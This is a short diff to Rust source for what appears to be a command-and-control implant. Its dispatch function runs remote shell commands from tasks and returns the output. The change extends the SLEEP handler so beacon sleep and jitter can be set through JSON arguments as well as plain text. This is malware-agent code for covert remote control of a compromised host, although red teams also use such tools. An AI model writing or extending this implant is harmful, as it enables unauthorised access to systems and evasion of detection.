@@ -1306,12 +1306,22 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
             t.send_result(task.id, &shell(&task.args), "");
         }
         "SLEEP" => {
-            let parts: Vec<&str> = task.args.split_whitespace().collect();
-            if let Some(s) = parts.first().and_then(|v| v.parse::<u64>().ok()) {
-                DYN_SLEEP_SEC.store(s, Ordering::Relaxed);
-            }
-            if let Some(j) = parts.get(1).and_then(|v| v.parse::<u64>().ok()) {
-                DYN_JITTER_PCT.store(j, Ordering::Relaxed);
+            if task.args.trim_start().starts_with('{') {
+                let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
+                if let Some(s) = j.get("sec").and_then(|v| v.as_u64()) {
+                    DYN_SLEEP_SEC.store(s, Ordering::Relaxed);
+                }
+                if let Some(jitter) = j.get("jitter").and_then(|v| v.as_u64()) {
+                    DYN_JITTER_PCT.store(jitter, Ordering::Relaxed);
+                }
+            } else {
+                let parts: Vec<&str> = task.args.split_whitespace().collect();
+                if let Some(s) = parts.first().and_then(|v| v.parse::<u64>().ok()) {
+                    DYN_SLEEP_SEC.store(s, Ordering::Relaxed);
+                }
+                if let Some(jitter) = parts.get(1).and_then(|v| v.parse::<u64>().ok()) {
+                    DYN_JITTER_PCT.store(jitter, Ordering::Relaxed);
+                }
             }
             t.send_result(task.id, "[+] sleep updated", "");
         }
